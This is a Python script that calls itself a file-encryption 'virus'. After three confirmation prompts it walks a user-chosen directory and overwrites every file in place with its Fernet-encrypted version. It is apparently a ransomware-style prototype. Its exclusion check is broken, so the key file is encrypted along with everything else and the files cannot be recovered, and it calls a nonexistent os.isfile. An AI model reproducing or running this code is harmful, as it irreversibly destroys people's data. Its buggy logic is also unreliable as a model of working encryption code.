import os
from cryptography.fernet import Fernet

if __name__ == '__main__':

	#record the encyrption key to a key file
	#run only once, then disable it
	"""key = Fernet.generate_key()
	fernet = Fernet(key)

	print(f"\nKey: {key}")

	with open("encryptionKey.key",'wb') as keyFile:
		keyFile.write(key)"""

	with open("encryptionKey.key", "rb") as keyFile:
			key = keyFile.read()
	fernet = Fernet(key)

	print(f"Encryption Key: {key}")
	
	def doubt():
		acceptWords = [
  			'yes','ye','sure','ofc','of course','definitely','absolutely','with pleasure','i do','indeed','positive','true'
		]
		denyWords = [
  			'no','nah','no thanks','ofc not','of course not','definitely not','absolutely not',"i don't",'i do not','negative','false'
		]
		choice = input("Do you know what you are doing?\n")
		if choice in acceptWords and choice not in denyWords:
			choice = input("Are you sure you want to proceed?\n")
			if choice in acceptWords and choice not in denyWords:
				choice = input("Do you still want to proceed despite knowing the risks?\n")
				if choice in acceptWords and choice not in denyWords:
					return True
				
	def encrypt(fpath):
		with open(rf'{fpath}', 'rb') as file:
			original = file.read()
	
		encrypted = fernet.encrypt(original)
		
		with open(rf'{fpath}', 'wb') as encryptedFile:
			encryptedFile.write(encrypted)

	def chooseDir():
		dpath = input("Input directory path:\n")
		while os.path.isdir(dpath) == False:
			if os.path.exists(dpath):
				if os.isfile(dpath):
					print(f"{dpath} is a file and not a directory!")
					dpath = input("Input directory path:\n")
				else:
					raise Exception(f"wtf happened here: path provided ({dpath}) is not an existing directory, is not an existing file, but also somehow exists???")
			elif os.path.exists(dpath) == False:
				print(f"{dpath} does not exist!")
				dpath = input("Input directory path:\n")
		return dpath
	
	def encryptDir(dpath):
		os.chdir(dpath)
		for parent, dirs, files in os.walk('.'):
			print(files) #testing purposes, remember to remove this line
			for fname in files:
				if fname != 'fileEncryptVirus.txt' and 'encryptionkey.key':
					fpath = os.path.join(parent, fname)
					encrypt(fpath)										#testing purposes, remember to remove this line
					print(f"Encrypted {fname} at {fpath}")				#testing purposes, remember to remove this line
					print("--------------------------------------------------------------------------------------------------------------------------------")

	choice = doubt()
	if choice:
		dpath = chooseDir()	
		encryptDir(dpath)
